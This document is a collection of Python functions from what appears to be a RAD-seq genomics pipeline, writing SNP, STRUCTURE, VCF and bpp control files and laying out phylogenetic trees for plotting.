def enter_singles ( iloc , pnames , snppad , edg , aseqs , asnps , smask , samplecov , locuscov , start ) : ## grab all seqs between edges seq = aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] ## snps was created using only the selected samples, and is edge masked. ## The mask is for counting snps quickly, but trimming is still needed here ## to make the snps line up with the seqs in the snp string. snp = asnps [ iloc , edg [ 0 ] : edg [ 1 ] + 1 , ] ## remove rows with all Ns, seq has only selected samples nalln = np . all ( seq == "N" , axis = 1 ) ## make mask of removed rows and excluded samples. Use the inverse ## of this to save the coverage for samples nsidx = nalln + smask samplecov = samplecov + np . invert ( nsidx ) . astype ( np . int32 ) idx = np . sum ( np . invert ( nsidx ) . astype ( np . int32 ) ) locuscov [ idx ] += 1 ## select the remaining names in order seq = seq [ ~ nsidx , ] names = pnames [ ~ nsidx ] ## save string for printing, excluding names not in samples outstr = "\n" . join ( [ name + s . tostring ( ) for name , s in zip ( names , seq ) ] ) ## get snp string and add to store snpstring = [ "-" if snp [ i , 0 ] else "*" if snp [ i , 1 ] else " " for i in range ( len ( snp ) ) ] outstr += "\n" + snppad + "" . join ( snpstring ) + "|{}|" . format ( iloc + start ) #LOGGER.info("outstr %s", outstr) return outstr , samplecov , locuscov
def snpcount_numba ( superints , snpsarr ) : ## iterate over all loci for iloc in xrange ( superints . shape [ 0 ] ) : for site in xrange ( superints . shape [ 2 ] ) : ## make new array catg = np . zeros ( 4 , dtype = np . int16 ) ## a list for only catgs ncol = superints [ iloc , : , site ] for idx in range ( ncol . shape [ 0 ] ) : if ncol [ idx ] == 67 : #C catg [ 0 ] += 1 elif ncol [ idx ] == 65 : #A catg [ 1 ] += 1 elif ncol [ idx ] == 84 : #T catg [ 2 ] += 1 elif ncol [ idx ] == 71 : #G catg [ 3 ] += 1 elif ncol [ idx ] == 82 : #R catg [ 1 ] += 1 #A catg [ 3 ] += 1 #G elif ncol [ idx ] == 75 : #K catg [ 2 ] += 1 #T catg [ 3 ] += 1 #G elif ncol [ idx ] == 83 : #S catg [ 0 ] += 1 #C catg [ 3 ] += 1 #G elif ncol [ idx ] == 89 : #Y catg [ 0 ] += 1 #C catg [ 2 ] += 1 #T elif ncol [ idx ] == 87 : #W catg [ 1 ] += 1 #A catg [ 2 ] += 1 #T elif ncol [ idx ] == 77 : #M catg [ 0 ] += 1 #C catg [ 1 ] += 1 #A ## get second most common site catg . sort ( ) ## if invariant e.g., [0, 0, 0, 9], then nothing (" ") if not catg [ 2 ] : pass else : if catg [ 2 ] > 1 : snpsarr [ iloc , site , 1 ] = True else : snpsarr [ iloc , site , 0 ] = True return snpsarr
def write_snps_map ( data ) : ## grab map data from tmparr start = time . time ( ) tmparrs = os . path . join ( data . dirs . outfiles , "tmp-{}.h5" . format ( data . name ) ) with h5py . File ( tmparrs , 'r' ) as io5 : maparr = io5 [ "maparr" ] [ : ] ## get last data  end = np . where ( np . all ( maparr [ : ] == 0 , axis = 1 ) ) [ 0 ] if np . any ( end ) : end = end . min ( ) else : end = maparr . shape [ 0 ] ## write to map file (this is too slow...) outchunk = [ ] with open ( data . outfiles . snpsmap , 'w' ) as out : for idx in xrange ( end ) : ## build to list line = maparr [ idx , : ] #print(line) outchunk . append ( "{}\trad{}_snp{}\t{}\t{}\n" . format ( line [ 0 ] , line [ 1 ] , line [ 2 ] , 0 , line [ 3 ] ) ) ## clear list if not idx % 10000 : out . write ( "" . join ( outchunk ) ) outchunk = [ ] ## write remaining out . write ( "" . join ( outchunk ) ) LOGGER . debug ( "finished writing snps_map in: %s" , time . time ( ) - start )
def write_usnps ( data , sidx , pnames ) : ## grab bis data from tmparr tmparrs = os . path . join ( data . dirs . outfiles , "tmp-{}.h5" . format ( data . name ) ) with h5py . File ( tmparrs , 'r' ) as io5 : bisarr = io5 [ "bisarr" ] ## trim to size b/c it was made longer than actual end = np . where ( np . all ( bisarr [ : ] == "" , axis = 0 ) ) [ 0 ] if np . any ( end ) : end = end . min ( ) else : end = bisarr . shape [ 1 ] ## write to usnps file with open ( data . outfiles . usnpsphy , 'w' ) as out : out . write ( "{} {}\n" . format ( bisarr . shape [ 0 ] , end ) ) for idx , name in enumerate ( pnames ) : out . write ( "{}{}\n" . format ( name , "" . join ( bisarr [ idx , : end ] ) ) )
def write_str ( data , sidx , pnames ) : ## grab snp and bis data from tmparr start = time . time ( ) tmparrs = os . path . join ( data . dirs . outfiles , "tmp-{}.h5" . format ( data . name ) ) with h5py . File ( tmparrs , 'r' ) as io5 : snparr = io5 [ "snparr" ] bisarr = io5 [ "bisarr" ] ## trim to size b/c it was made longer than actual bend = np . where ( np . all ( bisarr [ : ] == "" , axis = 0 ) ) [ 0 ] if np . any ( bend ) : bend = bend . min ( ) else : bend = bisarr . shape [ 1 ] send = np . where ( np . all ( snparr [ : ] == "" , axis = 0 ) ) [ 0 ] if np . any ( send ) : send = send . min ( ) else : send = snparr . shape [ 1 ] ## write to str and ustr out1 = open ( data . outfiles . str , 'w' ) out2 = open ( data . outfiles . ustr , 'w' ) numdict = { 'A' : '0' , 'T' : '1' , 'G' : '2' , 'C' : '3' , 'N' : '-9' , '-' : '-9' } if data . paramsdict [ "max_alleles_consens" ] > 1 : for idx , name in enumerate ( pnames ) : out1 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in snparr [ idx , : send ] ] ) ) ) out1 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 1 ] ] for i in snparr [ idx , : send ] ] ) ) ) out2 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in bisarr [ idx , : bend ] ] ) ) ) out2 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 1 ] ] for i in bisarr [ idx , : bend ] ] ) ) ) else : ## haploid output for idx , name in enumerate ( pnames ) : out1 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in snparr [ idx , : send ] ] ) ) ) out2 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in bisarr [ idx , : bend ] ] ) ) ) out1 . close ( ) out2 . close ( ) LOGGER . debug ( "finished writing str in: %s" , time . time ( ) - start )
def concat_vcf ( data , names , full ) : ## open handle and write headers if not full : writer = open ( data . outfiles . vcf , 'w' ) else : writer = gzip . open ( data . outfiles . VCF , 'w' ) vcfheader ( data , names , writer ) writer . close ( ) ## get vcf chunks vcfchunks = glob . glob ( data . outfiles . vcf + ".*" ) vcfchunks . sort ( key = lambda x : int ( x . rsplit ( "." ) [ - 1 ] ) ) ## concatenate if not full : writer = open ( data . outfiles . vcf , 'a' ) else : writer = gzip . open ( data . outfiles . VCF , 'a' ) ## what order do users want? The order in the original ref file? ## Sorted by the size of chroms? that is the order in faidx. ## If reference mapping then it's nice to sort the vcf data by ## CHROM and POS. This is doing a very naive sort right now, so the ## CHROM will be ordered, but not the pos within each chrom. if data . paramsdict [ "assembly_method" ] in [ "reference" , "denovo+reference" ] : ## Some unix sorting magic to get POS sorted within CHROM ## First you sort by POS (-k 2,2), then you do a `stable` sort  ## by CHROM. You end up with POS ordered and grouped correctly by CHROM ## but relatively unordered CHROMs (locus105 will be before locus11). cmd = [ "cat" ] + vcfchunks + [ " | sort -k 2,2 -n | sort -k 1,1 -s" ] cmd = " " . join ( cmd ) proc = sps . Popen ( cmd , shell = True , stderr = sps . STDOUT , stdout = writer , close_fds = True ) else : proc = sps . Popen ( [ "cat" ] + vcfchunks , stderr = sps . STDOUT , stdout = writer , close_fds = True ) err = proc . communicate ( ) [ 0 ] if proc . returncode : raise IPyradWarningExit ( "err in concat_vcf: %s" , err ) writer . close ( ) for chunk in vcfchunks : os . remove ( chunk )
def vcfchunk ( data , optim , sidx , chunk , full ) : ## empty array to be filled before writing ## will not actually be optim*maxlen, extra needs to be trimmed maxlen = data . _hackersonly [ "max_fragment_length" ] + 20 ## get data sliced (optim chunks at a time) hslice = [ chunk , chunk + optim ] ## read all taxa from disk (faster), then subsample taxa with sidx and ## keepmask to greatly reduce the memory load with h5py . File ( data . database , 'r' ) as co5 : afilt = co5 [ "filters" ] [ hslice [ 0 ] : hslice [ 1 ] , : ] keepmask = afilt . sum ( axis = 1 ) == 0 ## apply mask to edges aedge = co5 [ "edges" ] [ hslice [ 0 ] : hslice [ 1 ] , : ] aedge = aedge [ keepmask , : ] del afilt ## same memory subsampling. with h5py . File ( data . clust_database , 'r' ) as io5 : ## apply mask to edges to aseqs and acatg #aseqs = io5["seqs"][hslice[0]:hslice[1], :, :].view(np.uint8) ## need to read in seqs with upper b/c lowercase allele info aseqs = np . char . upper ( io5 [ "seqs" ] [ hslice [ 0 ] : hslice [ 1 ] , : , : ] ) . view ( np . uint8 ) aseqs = aseqs [ keepmask , : ] aseqs = aseqs [ : , sidx , : ] acatg = io5 [ "catgs" ] [ hslice [ 0 ] : hslice [ 1 ] , : , : , : ] acatg = acatg [ keepmask , : ] acatg = acatg [ : , sidx , : , : ] achrom = io5 [ "chroms" ] [ hslice [ 0 ] : hslice [ 1 ] ] achrom = achrom [ keepmask , : ] LOGGER . info ( 'acatg.shape %s' , acatg . shape ) ## to save memory some columns are stored in diff dtypes until printing if not full : with h5py . File ( data . database , 'r' ) as co5 : snps = co5 [ "snps" ] [ hslice [ 0 ] : hslice [ 1 ] , : ] snps = snps [ keepmask , : ] snps = snps . sum ( axis = 2 ) snpidxs = snps > 0 maxsnplen = snps . sum ( ) ## vcf info to fill, this is bigger than the actual array nrows = maxsnplen cols0 = np . zeros ( nrows , dtype = np . int64 ) #h5py.special_dtype(vlen=bytes)) cols1 = np . zeros ( nrows , dtype = np . uint32 ) cols34 = np . zeros ( ( nrows , 2 ) , dtype = "S5" ) cols7 = np . zeros ( ( nrows , 1 ) , dtype = "S20" ) ## when nsamples is high this blows up memory (e.g., dim=(5M x 500)) ## so we'll instead create a list of arrays with 10 samples at a time. ## maybe later replace this with a h5 array tmph = os . path . join ( data . dirs . outfiles , ".tmp.{}.h5" . format ( hslice [ 0 ] ) ) htmp = h5py . File ( tmph , 'w' ) htmp . create_dataset ( "vcf" , shape = ( nrows , sum ( sidx ) ) , dtype = "S24" ) ## which loci passed all filters init = 0 ## write loci that passed after trimming edges, then write snp string locindex = np . where ( keepmask ) [ 0 ] for iloc in xrange ( aseqs . shape [ 0 ] ) : edg = aedge [ iloc ] ## grab all seqs between edges if not 'pair' in data . paramsdict [ "datatype" ] : seq = aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] catg = acatg [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] if not full : snpidx = snpidxs [ iloc , edg [ 0 ] : edg [ 1 ] + 1 ] seq = seq [ : , snpidx ] catg = catg [ : , snpidx ] else : seq = np . hstack ( [ aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] , aseqs [ iloc , : , edg [ 2 ] : edg [ 3 ] + 1 ] ] ) catg = np . hstack ( [ acatg [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] , acatg [ iloc , : , edg [ 2 ] : edg [ 3 ] + 1 ] ] ) if not full : snpidx = np . hstack ( [ snpidxs [ iloc , edg [ 0 ] : edg [ 1 ] + 1 ] , snpidxs [ iloc , edg [ 2 ] : edg [ 3 ] + 1 ] ] ) seq = seq [ : , snpidx ] catg = catg [ : , snpidx ] ## empty arrs to fill alleles = np . zeros ( ( nrows , 4 ) , dtype = np . uint8 ) genos = np . zeros ( ( seq . shape [ 1 ] , sum ( sidx ) ) , dtype = "S4" ) genos [ : ] = "./.:" ## ----  build string array ---- pos = 0 ## If any < 0 this indicates an anonymous locus in denovo+ref assembly if achrom [ iloc ] [ 0 ] > 0 : pos = achrom [ iloc ] [ 1 ] cols0 [ init : init + seq . shape [ 1 ] ] = achrom [ iloc ] [ 0 ] cols1 [ init : init + seq . shape [ 1 ] ] = pos + np . where ( snpidx ) [ 0 ] + 1 else : if full : cols1 [ init : init + seq . shape [ 1 ] ] = pos + np . arange ( seq . shape [ 1 ] ) + 1 else : cols1 [ init : init + seq . shape [ 1 ] ] = pos + np . where ( snpidx ) [ 0 ] + 1 cols0 [ init : init + seq . shape [ 1 ] ] = ( chunk + locindex [ iloc ] + 1 ) * - 1 ## fill reference base alleles = reftrick ( seq , GETCONS ) ## get the info string column tmp0 = np . sum ( catg , axis = 2 ) tmp1 = tmp0 != 0 tmp2 = tmp1 . sum ( axis = 1 ) > 0 nsamp = np . sum ( tmp1 , axis = 0 ) depth = np . sum ( tmp0 , axis = 0 ) list7 = [ [ "NS={};DP={}" . format ( i , j ) ] for i , j in zip ( nsamp , depth ) ] if list7 : cols7 [ init : init + seq . shape [ 1 ] ] = list7 ## default fill cons sites where no variants genos [ tmp1 . T ] = "0/0:" ## fill cons genotypes for sites with alt alleles for taxa in order mask = alleles [ : , 1 ] == 46 mask += alleles [ : , 1 ] == 45 obs = alleles [ ~ mask , : ] alts = seq [ : , ~ mask ] who = np . where ( mask == False ) [ 0 ] ## fill variable sites for site in xrange ( alts . shape [ 1 ] ) : bases = alts [ : , site ] #LOGGER.info("bases %s", bases) ohere = obs [ site ] [ obs [ site ] != 0 ] #LOGGER.info("ohere %s", ohere) alls = np . array ( [ DCONS [ i ] for i in bases ] , dtype = np . uint32 ) #LOGGER.info("all %s", alls) for jdx in xrange ( ohere . shape [ 0 ] ) : alls [ alls == ohere [ jdx ] ] = jdx #LOGGER.info("all2 %s", alls) ## fill into array for cidx in xrange ( catg . shape [ 0 ] ) : if tmp2 [ cidx ] : if alls [ cidx ] [ 0 ] < 5 : genos [ who [ site ] , cidx ] = "/" . join ( alls [ cidx ] . astype ( "S1" ) . tolist ( ) ) + ":" else : genos [ who [ site ] , cidx ] = "./.:" #LOGGER.info("genos filled: %s %s %s", who[site], cidx, genos) ## build geno+depth strings ## for each taxon enter 4 catg values fulltmp = np . zeros ( ( seq . shape [ 1 ] , catg . shape [ 0 ] ) , dtype = "S24" ) for cidx in xrange ( catg . shape [ 0 ] ) : ## fill catgs from catgs tmp0 = [ str ( i . sum ( ) ) for i in catg [ cidx ] ] tmp1 = [ "," . join ( i ) for i in catg [ cidx ] . astype ( "S4" ) . tolist ( ) ] tmp2 = [ "" . join ( i + j + ":" + k ) for i , j , k in zip ( genos [ : , cidx ] , tmp0 , tmp1 ) ] ## fill tmp allcidx fulltmp [ : , cidx ] = tmp2 ## write to h5 for this locus htmp [ "vcf" ] [ init : init + seq . shape [ 1 ] , : ] = fulltmp cols34 [ init : init + seq . shape [ 1 ] , 0 ] = alleles [ : , 0 ] . view ( "S1" ) cols34 [ init : init + seq . shape [ 1 ] , 1 ] = [ "," . join ( [ j for j in i if j ] ) for i in alleles [ : , 1 : ] . view ( "S1" ) . tolist ( ) ] ## advance counter init += seq . shape [ 1 ] ## trim off empty rows if they exist withdat = cols0 != 0 tot = withdat . sum ( ) ## get scaffold names faidict = { } if ( data . paramsdict [ "assembly_method" ] in [ "reference" , "denovo+reference" ] ) and ( os . path . exists ( data . paramsdict [ "reference_sequence" ] ) ) : fai = pd . read_csv ( data . paramsdict [ "reference_sequence" ] + ".fai" , names = [ 'scaffold' , 'size' , 'sumsize' , 'a' , 'b' ] , sep = "\t" ) faidict = { i + 1 : j for i , j in enumerate ( fai . scaffold ) } try : ## This is hax, but it's the only way it will work. The faidict uses positive numbers ## for reference sequence mapped loci for the CHROM/POS info, and it uses negative ## numbers for anonymous loci. Both are 1 indexed, which is where that last `+ 2` comes from. faidict . update ( { - i : "locus_{}" . format ( i - 1 ) for i in xrange ( chunk + 1 , chunk + optim + 2 ) } ) chroms = [ faidict [ i ] for i in cols0 ] except Exception as inst : LOGGER . error ( "Invalid chromosome dictionary indexwat: {}" . format ( inst ) ) LOGGER . debug ( "faidict {}" . format ( [ str ( k ) + "/" + str ( v ) for k , v in faidict . items ( ) if "locus" in v ] ) ) LOGGER . debug ( "chroms {}" . format ( [ x for x in cols0 if x < 0 ] ) ) raise cols0 = np . array ( chroms ) #else: #    cols0 = np.array(["locus_{}".format(i) for i in cols0-1]) ## Only write if there is some data that passed filtering if tot : LOGGER . debug ( "Writing data to vcf" ) if not full : writer = open ( data . outfiles . vcf + ".{}" . format ( chunk ) , 'w' ) else : writer = gzip . open ( data . outfiles . vcf + ".{}" . format ( chunk ) , 'w' ) try : ## write in iterations b/c it can be freakin huge. ## for cols0 and cols1 the 'newaxis' slice and the transpose ## are for turning the 1d arrays into column vectors. np . savetxt ( writer , np . concatenate ( ( cols0 [ : tot ] [ np . newaxis ] . T , cols1 [ : tot ] [ np . newaxis ] . T , np . array ( [ [ "." ] ] * tot , dtype = "S1" ) , cols34 [ : tot , : ] , np . array ( [ [ "13" , "PASS" ] ] * tot , dtype = "S4" ) , cols7 [ : tot , : ] , np . array ( [ [ "GT:DP:CATG" ] ] * tot , dtype = "S10" ) , htmp [ "vcf" ] [ : tot , : ] , ) , axis = 1 ) , delimiter = "\t" , fmt = "%s" ) except Exception as inst : LOGGER . error ( "Error building vcf file - " . format ( inst ) ) raise writer . close ( ) ## close and remove tmp h5 htmp . close ( ) os . remove ( tmph )
def reftrick ( iseq , consdict ) : altrefs = np . zeros ( ( iseq . shape [ 1 ] , 4 ) , dtype = np . uint8 ) altrefs [ : , 1 ] = 46 for col in xrange ( iseq . shape [ 1 ] ) : ## expand colums with ambigs and remove N- fcounts = np . zeros ( 111 , dtype = np . int64 ) counts = np . bincount ( iseq [ : , col ] ) #, minlength=90) fcounts [ : counts . shape [ 0 ] ] = counts ## set N and - to zero, wish numba supported minlen arg fcounts [ 78 ] = 0 fcounts [ 45 ] = 0 ## add ambig counts to true bases for aidx in xrange ( consdict . shape [ 0 ] ) : nbases = fcounts [ consdict [ aidx , 0 ] ] for _ in xrange ( nbases ) : fcounts [ consdict [ aidx , 1 ] ] += 1 fcounts [ consdict [ aidx , 2 ] ] += 1 fcounts [ consdict [ aidx , 0 ] ] = 0 ## now get counts from the modified counts arr who = np . argmax ( fcounts ) altrefs [ col , 0 ] = who fcounts [ who ] = 0 ## if an alt allele fill over the "." placeholder who = np . argmax ( fcounts ) if who : altrefs [ col , 1 ] = who fcounts [ who ] = 0 ## if 3rd or 4th alleles observed then add to arr who = np . argmax ( fcounts ) altrefs [ col , 2 ] = who fcounts [ who ] = 0 ## if 3rd or 4th alleles observed then add to arr who = np . argmax ( fcounts ) altrefs [ col , 3 ] = who return altrefs
def vcfheader ( data , names , ofile ) : ## choose reference string if data . paramsdict [ "reference_sequence" ] : reference = data . paramsdict [ "reference_sequence" ] else : reference = "pseudo-reference (most common base at site)" ##FILTER=<ID=minCov,Description="Data shared across <{mincov} samples"> ##FILTER=<ID=maxSH,Description="Heterozygosous site shared across >{maxsh} samples"> header = . format ( date = time . strftime ( "%Y/%m/%d" ) , version = __version__ , reference = os . path . basename ( reference ) , mincov = data . paramsdict [ "min_samples_locus" ] , maxsh = data . paramsdict [ "max_shared_Hs_locus" ] , names = "\t" . join ( names ) ) ## WRITE ofile . write ( header )
def write_ctl ( name , imap , guidetree , nloci , infer_sptree , infer_delimit , delimit_alg , seed , burnin , nsample , sampfreq , thetaprior , tauprior , traits_df , nu0 , kappa0 , cleandata , useseqdata , usetraitdata , wdir , finetune , verbose ) : ## A string to store ctl info ctl = [ ] ## check the tree (can do this better once we install ete3 w/ ipyrad) if not guidetree . endswith ( ";" ) : guidetree += ";" ## if traits_df then we make '.ibpp' files prog = 'bpp' if isinstance ( traits_df , pd . DataFrame ) : prog = 'ibpp' ## write the top header info ctl . append ( "seed = {}" . format ( seed ) ) ctl . append ( "seqfile = {}.{}.seq.txt" . format ( OPJ ( wdir , name ) , prog ) ) ctl . append ( "Imapfile = {}.{}.imap.txt" . format ( OPJ ( wdir , name ) , prog ) ) ctl . append ( "mcmcfile = {}.{}.mcmc.txt" . format ( OPJ ( wdir , name ) , prog ) ) ctl . append ( "outfile = {}.{}.out.txt" . format ( OPJ ( wdir , name ) , prog ) ) if isinstance ( traits_df , pd . DataFrame ) : ctl . append ( "traitfile = {}.{}.traits.txt" . format ( OPJ ( wdir , name ) , prog ) ) ## number of loci (checks that seq file exists and parses from there) ctl . append ( "nloci = {}" . format ( nloci ) ) ctl . append ( "usedata = {}" . format ( useseqdata ) ) ctl . append ( "cleandata = {}" . format ( cleandata ) ) ## infer species tree if infer_sptree : ctl . append ( "speciestree = 1 0.4 0.2 0.1" ) else : ctl . append ( "speciestree = 0" ) ## infer delimitation (with algorithm 1 by default) ctl . append ( "speciesdelimitation = {} {} {}" . format ( infer_delimit , delimit_alg [ 0 ] , " " . join ( [ str ( i ) for i in delimit_alg [ 1 : ] ] ) ) ) ## if using iBPP (if not traits_df, we assume you're using bpp (v.3.3+) if isinstance ( traits_df , pd . DataFrame ) : ## check that the data frame is properly formatted try : traits_df . values . astype ( float ) except Exception : raise IPyradWarningExit ( PDREAD_ERROR ) ## subsample to keep only samples that are in IMAP, we do not need to ## standarize traits b/c ibpp does that for us. samples = sorted ( list ( itertools . chain ( * imap . values ( ) ) ) ) didx = [ list ( traits_df . index ) . index ( i ) for i in traits_df . index if i not in samples ] dtraits = traits_df . drop ( traits_df . index [ didx ] ) ## mean standardize traits values after excluding samples straits = dtraits . apply ( lambda x : ( x - x . mean ( ) ) / ( x . std ( ) ) ) ## convert NaN to "NA" cuz that's what ibpp likes, and write to file ftraits = straits . fillna ( "NA" ) traitdict = ftraits . T . to_dict ( "list" ) ## get reverse imap dict rev = { val : key for key in sorted ( imap ) for val in imap [ key ] } ## write trait file traitfile = "{}.{}.traits.txt" . format ( os . path . join ( wdir , name ) , prog ) with open ( traitfile , 'w' ) as tout : tout . write ( "Indiv\n" ) tout . write ( "\t" . join ( [ 'Species' ] + list ( ftraits . columns ) ) + "\n" ) #for key in sorted(traitdict): #    tout.write("\t".join([key, rev[key]] + \ #        ["^"+str(i) for i in traitdict[key]])+"\n" #        ) nindT = 0 for ikey in sorted ( imap . keys ( ) ) : samps = imap [ ikey ] for samp in sorted ( samps ) : if samp in traitdict : tout . write ( "\t" . join ( [ samp , rev [ samp ] ] + [ str ( i ) for i in traitdict [ samp ] ] ) + "\n" ) nindT += 1 #    tout.write("Indiv\n"+"\t".join(["Species"]+\ #    ["t_{}".format(i) for i in range(len(traitdict.values()[0]))])+"\n") #    for key in sorted(traitdict): #        print >>tout, "\t".join([key, rev[key]] + \ #                                [str(i) for i in traitdict[key]]) #ftraits.to_csv(traitfile) ## write ntraits and nindT and traitfilename ctl . append ( "ntraits = {}" . format ( traits_df . shape [ 1 ] ) ) ctl . append ( "nindT = {}" . format ( nindT ) ) #traits_df.shape[0])) ctl . append ( "usetraitdata = {}" . format ( usetraitdata ) ) ctl . append ( "useseqdata = {}" . format ( useseqdata ) ) ## trait priors ctl . append ( "nu0 = {}" . format ( nu0 ) ) ctl . append ( "kappa0 = {}" . format ( kappa0 ) ) ## remove ibpp incompatible options ctl . remove ( "usedata = {}" . format ( useseqdata ) ) ctl . remove ( "speciestree = {}" . format ( infer_sptree ) ) ## get tree values nspecies = str ( len ( imap ) ) species = " " . join ( sorted ( imap ) ) ninds = " " . join ( [ str ( len ( imap [ i ] ) ) for i in sorted ( imap ) ] ) ## write the tree ctl . append ( . format ( nspecies , species , ninds , guidetree ) ) ## priors ctl . append ( "thetaprior = {} {}" . format ( * thetaprior ) ) ctl . append ( "tauprior = {} {} {}" . format ( * tauprior ) ) ## other values, fixed for now ctl . append ( "finetune = 1: {}" . format ( " " . join ( [ str ( i ) for i in finetune ] ) ) ) #CTL.append("finetune = 1: 1 0.002 0.01 0.01 0.02 0.005 1.0") ctl . append ( "print = 1 0 0 0" ) ctl . append ( "burnin = {}" . format ( burnin ) ) ctl . append ( "sampfreq = {}" . format ( sampfreq ) ) ctl . append ( "nsample = {}" . format ( nsample ) ) ## write out the ctl file with open ( "{}.{}.ctl.txt" . format ( OPJ ( wdir , name ) , prog ) , 'w' ) as out : out . write ( "\n" . join ( ctl ) ) ## if verbose print ctl if verbose : sys . stderr . write ( "ctl file\n--------\n" + "\n" . join ( ctl ) + "\n--------\n\n" )
def _collapse_outgroup ( tree , taxdicts ) : ## check that all tests have the same outgroup outg = taxdicts [ 0 ] [ "p4" ] if not all ( [ i [ "p4" ] == outg for i in taxdicts ] ) : raise Exception ( "no good" ) ## prune tree, keep only one sample from outgroup tre = ete . Tree ( tree . write ( format = 1 ) ) #tree.copy(method="deepcopy") alltax = [ i for i in tre . get_leaf_names ( ) if i not in outg ] alltax += [ outg [ 0 ] ] tre . prune ( alltax ) tre . search_nodes ( name = outg [ 0 ] ) [ 0 ] . name = "outgroup" tre . ladderize ( ) ## remove other ougroups from taxdicts taxd = copy . deepcopy ( taxdicts ) newtaxdicts = [ ] for test in taxd : #test["p4"] = [outg[0]] test [ "p4" ] = [ "outgroup" ] newtaxdicts . append ( test ) return tre , newtaxdicts
def _decompose_tree ( ttree , orient = 'right' , use_edge_lengths = True ) : ## set attributes ttree . _orient = orient ttree . _use_edge_lengths = use_edge_lengths ult = use_edge_lengths == False ## map numeric values to internal nodes from root to tips names = { } idx = 0 for node in ttree . tree . traverse ( "preorder" ) : if not node . is_leaf ( ) : if node . name : names [ idx ] = node . name else : names [ idx ] = idx node . name = str ( idx ) node . idx = idx idx += 1 ## map number to the tips, these will be the highest numbers for node in ttree . tree . get_leaves ( ) : names [ idx ] = node . name node . idx = idx idx += 1 ## create empty edges and coords arrays ttree . node_labels = names ttree . tip_labels = ttree . tree . get_leaf_names ( ) #self.tip_labels = self.tree.get_leaf_names()[::-1] #self.node_labels = self.names ttree . edges = np . zeros ( ( idx - 1 , 2 ) , dtype = int ) ttree . verts = np . zeros ( ( idx , 2 ) , dtype = float ) ttree . _lines = [ ] # np.zeros((ntips-1), dtype=int) ttree . _coords = [ ] # np.zeros((idx * 2 - ntips), dtype=float) ## postorder: first children and then parents. This moves up the list . nidx = 0 tip_num = len ( ttree . tree . get_leaves ( ) ) - 1 ## tips to root to fill in the verts and edges for node in ttree . tree . traverse ( "postorder" ) : if node . is_leaf ( ) : ## set the xy-axis positions of the tips node . y = ttree . tree . get_distance ( node ) if ult : node . y = 0. node . x = tip_num tip_num -= 1 ## edges connect this vert to ttree . verts [ node . idx ] = [ node . x , node . y ] ttree . edges [ nidx ] = [ node . up . idx , node . idx ] elif node . is_root ( ) : node . y = ttree . tree . get_distance ( node ) if ult : node . y = - 1 * node . get_farthest_leaf ( True ) [ 1 ] - 1 node . x = sum ( i . x for i in node . children ) / float ( len ( node . children ) ) ttree . verts [ node . idx ] = [ node . x , node . y ] else : ## create new nodes left and right node . y = ttree . tree . get_distance ( node ) if ult : node . y = - 1 * node . get_farthest_leaf ( True ) [ 1 ] - 1 node . x = sum ( i . x for i in node . children ) / float ( len ( node . children ) ) ttree . edges [ nidx , : ] = [ node . up . idx , node . idx ] ttree . verts [ node . idx ] = [ node . x , node . y ] nidx += 1 ## root to tips to fill in the coords and lines cidx = 0 for node in ttree . tree . traverse ( ) : ## add yourself if not node . is_leaf ( ) : ttree . _coords += [ [ node . x , node . y ] ] pidx = cidx cidx += 1 for child in node . children : ## add children ttree . _coords += [ [ child . x , node . y ] , [ child . x , child . y ] ] ttree . _lines += [ [ pidx , cidx ] ] ## connect yourself to newx ttree . _lines += [ [ cidx , cidx + 1 ] ] ## connect newx to child cidx += 2 ttree . _coords = np . array ( ttree . _coords , dtype = float ) ttree . _lines = np . array ( ttree . _lines , dtype = int ) ## invert for sideways trees if ttree . _orient in [ 'up' , 0 ] : pass if ttree . _orient in [ 'left' , 1 ] : ttree . verts [ : , 1 ] = ttree . verts [ : , 1 ] * - 1 ttree . verts = ttree . verts [ : , [ 1 , 0 ] ] ttree . _coords [ : , 1 ] = ttree . _coords [ : , 1 ] * - 1 ttree . _coords = ttree . _coords [ : , [ 1 , 0 ] ] if ttree . _orient in [ 'down' , 0 ] : ttree . verts [ : , 1 ] = ttree . verts [ : , 1 ] * - 1 ttree . _coords [ : , 1 ] = ttree . _coords [ : , 1 ] * - 1 if ttree . _orient in [ 'right' , 3 ] : ttree . verts = ttree . verts [ : , [ 1 , 0 ] ] ttree . _coords = ttree . _coords [ : , [ 1 , 0 ] ]
def get_quick_depths ( data , sample ) : ## use existing sample cluster path if it exists, since this ## func can be used in step 4 and that can occur after merging ## assemblies after step3, and if we then referenced by data.dirs.clusts ## the path would be broken. ## ## If branching at step 3 to test different clust thresholds, the ## branched samples will retain the samples.files.clusters of the ## parent (which have the clust_threshold value of the parent), so ## it will look like nothing has changed. If we call this func ## from step 3 then it indicates we are in a branch and should ## reset the sample.files.clusters handle to point to the correct ## data.dirs.clusts directory. See issue #229. ## Easier to just always trust that samples.files.clusters is right, ## no matter what step? #if sample.files.clusters and not sample.stats.state == 3: #    pass #else: #    ## set cluster file handles sample . files . clusters = os . path . join ( data . dirs . clusts , sample . name + ".clustS.gz" ) ## get new clustered loci fclust = data . samples [ sample . name ] . files . clusters clusters = gzip . open ( fclust , 'r' ) pairdealer = itertools . izip ( * [ iter ( clusters ) ] * 2 ) ## storage depths = [ ] maxlen = [ ] ## start with cluster 0 tdepth = 0 tlen = 0 ## iterate until empty while 1 : ## grab next try : name , seq = pairdealer . next ( ) except StopIteration : break ## if not the end of a cluster #print name.strip(), seq.strip() if name . strip ( ) == seq . strip ( ) : depths . append ( tdepth ) maxlen . append ( tlen ) tlen = 0 tdepth = 0 else : tdepth += int ( name . split ( ";" ) [ - 2 ] [ 5 : ] ) tlen = len ( seq ) ## return clusters . close ( ) return np . array ( maxlen ) , np 